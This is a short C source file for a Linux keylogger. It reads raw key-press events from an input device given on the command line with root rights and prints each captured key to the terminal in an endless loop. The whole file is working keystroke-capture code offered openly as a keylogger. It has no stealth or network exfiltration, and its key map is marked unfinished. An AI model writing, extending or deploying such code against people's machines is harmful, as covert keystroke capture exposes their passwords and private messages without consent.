#include <stdio.h>
#include <fcntl.h>
#include <linux/input.h>
#include <unistd.h>

int main(int argc, char *argv[])
{
	if(argc != 2)
	{
		printf("Usage: sudo ./keylogger <sys keylogger path>");
		return -1;
	}
	
	int fd = open(argv[1], O_RDONLY, 0);
	
	struct input_event ie;

	printf("Keylogger active!");
	
	while(1)	
	{
		read(fd, &ie, sizeof(ie));
		
		if(ie.value != 1)
		{
			continue;
		}
		
		switch(ie.code)
		{
			case KEY_1:
				printf("1");
				break;
			case KEY_2:
				printf("2");
				break;
			case KEY_3:
				printf("3");
				break;
			case KEY_4:
				printf("4");
				break;
			case KEY_5:
				printf("5");
				break;
			case KEY_6:
				printf("6");
				break;
			case KEY_7:
				printf("7");
				break;
			case KEY_8:
				printf("8");
				break;
			case KEY_9:
				printf("9");
				break;
			case KEY_0:
				printf("0");
				break;
			case KEY_Q:
				printf("q");
				break;
			case KEY_W:
				printf("w");
				break;
			case KEY_E:
				printf("e");
				break;
			case KEY_R:
				printf("r");
				break;
			case KEY_T:
				printf("t");
				break;
			case KEY_Y:
				printf("y");
				break;
			case KEY_U:
				printf("u");
				break;
			case KEY_I:
				printf("i");
				break;
			case KEY_O:
				printf("o");
				break;
			case KEY_P:
				printf("p");
				break;
			case KEY_A:
				printf("a");
				break;
			case KEY_S:
				printf("s");
				break;
			case KEY_D:
				printf("d");
				break;
			case KEY_F:
				printf("f");
				break;
			case KEY_G:
				printf("g");
				break;
			case KEY_H:
				printf("h");
				break;
			case KEY_J:
				printf("j");
				break;
			case KEY_K:
				printf("k");
				break;
			case KEY_L:
				printf("l");
				break;
			case KEY_Z:
				printf("z");
				break;
			case KEY_X:
				printf("x");
				break;
			case KEY_C:
				printf("c");
				break;
			case KEY_V:
				printf("v");
				break;
			case KEY_B:
				printf("b");
				break;
			case KEY_N:
				printf("n");
				break;
			case KEY_M:
				printf("m");
				break;
			case KEY_SPACE:
				printf(" ");
				break;
			case KEY_ENTER:
				printf("(ENTER)");
				break;
			case KEY_LEFTSHIFT:
				printf("(LEFT SHIFT)");
				break;
			case KEY_RIGHTSHIFT:
				printf("(RIGHT SHIFT)");
				break;
			case KEY_CAPSLOCK:
				printf("(CAPS LOCK)");
				break;
			case KEY_BACKSPACE:
				printf("(BACKSPACE)");
				break;
			case KEY_COMMA:
				printf(",");
				break;
			case KEY_DOT:
				printf(".");
				break;
			case KEY_SLASH:
				printf("/");
				break;
			// More to be added...
		}

		fflush(stdout);
	}
}
